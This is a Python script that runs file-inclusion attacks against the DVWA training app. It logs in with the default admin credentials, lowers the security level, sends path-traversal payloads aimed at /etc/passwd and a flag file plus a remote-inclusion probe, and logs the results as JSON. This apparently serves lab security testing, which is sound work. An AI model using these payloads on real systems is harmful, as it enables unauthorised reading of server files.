import requests
from bs4 import BeautifulSoup
from datetime import datetime
from pathlib import Path
import os
import sys
import json
import time


# Setup directories and session
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)
session = requests.Session()

if len(sys.argv) > 2:
    base_url = sys.argv[1]
    request_rate = sys.argv[2]
else:
    print("Base URL and/or request rate were not provided.")
    sys.exit(1)

# Map request rate to a specific time interval
delays = {'low': 10, 'medium': 5, 'high': 3}
delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unrecognized

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'X-Forwarded-For': '192.168.1.1'
}

fi_url = f"{base_url}/vulnerabilities/fi/?page="
login_url = f"{base_url}/login.php"
security_url = f"{base_url}/security.php"


def login_and_setup_security():
    login_response = session.get(login_url)  
    soup = BeautifulSoup(login_response.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None

    login_data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
        'user_token': user_token  
    }
    login_response = session.post(login_url, data=login_data, headers=headers)
    
    
    if 'PHPSESSID' in session.cookies:
        print("Login successful, PHPSESSID:", session.cookies['PHPSESSID'])
    else:
        print("Login failed")
        return

    
    security_response = session.get(security_url)
    soup = BeautifulSoup(security_response.text, 'html.parser')
    security_token = soup.find('input', {'name': 'user_token'}).get('value')
    security_data = {
        'security': 'low',
        'seclev_submit': 'Submit',
        'user_token': security_token
    }
    session.post(security_url, data=security_data, headers=headers)

def file_inclusion_attack():
    file_paths = [
        "../../hackable/flags/fi.php",  # LFI
        "../../../../../../etc/passwd", # LFI
        "https://www.google.com"  # RFI
    ]
    total_tests = 0
    tests_passed = 0
    tests_failed = 0
    details = []

    for file_path in file_paths:
        full_url = fi_url + file_path
        response = session.get(full_url, headers=headers)
        total_tests += 1
        content_check = False

        if "https" in file_path:  # Assuming RFI attempt for https URLs
            test_type = "RFI"
            expected_contents = ["google", "Pesquisa Google", "Estou com sorte"]  # Examples of text expected from Google
            content_check = any(text in response.text for text in expected_contents)
        else:
            test_type = "LFI"
            expected_contents = ["1.) Bond. James Bond", "root:x:0:0:root"]
            content_check = any(text in response.text for text in expected_contents)

        if response.status_code == 200 and content_check:
            tests_passed += 1
            result_status = f"PASSED - {test_type} Successful"
        else:
            tests_failed += 1
            result_status = f"FAILED - {test_type} Unsuccessful"
        
        print(f"Tested {test_type} with path '{file_path}'\nResult Status: {result_status}\nResponse Code: {response.status_code}\nContent Check: {content_check}")
        time.sleep(delay)
        
        details.append({
            "test_type": test_type,
            "url": full_url,
            "path": file_path,
            "response_code": response.status_code,
            "status": result_status,
            "content_check": content_check  # Adding whether the content check was successful
        })
        

    # Log the results
    script_name = os.path.splitext(os.path.basename(__file__))[0]
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"results_{script_name}_{timestamp}.json"
    results_file = logs_dir / file_name
    result_summary = {
        'date_time': timestamp,
        'base_url': base_url,
        'total_tests': total_tests,
        'tests_passed': tests_passed,
        'tests_failed': tests_failed,
        'tested_url': fi_url,
        'details': details
    }
    with open(results_file, 'w') as f:
        json.dump(result_summary, f, indent=4)
    print(f"Results saved to {results_file}")

if __name__ == "__main__":
    login_and_setup_security()
    file_inclusion_attack()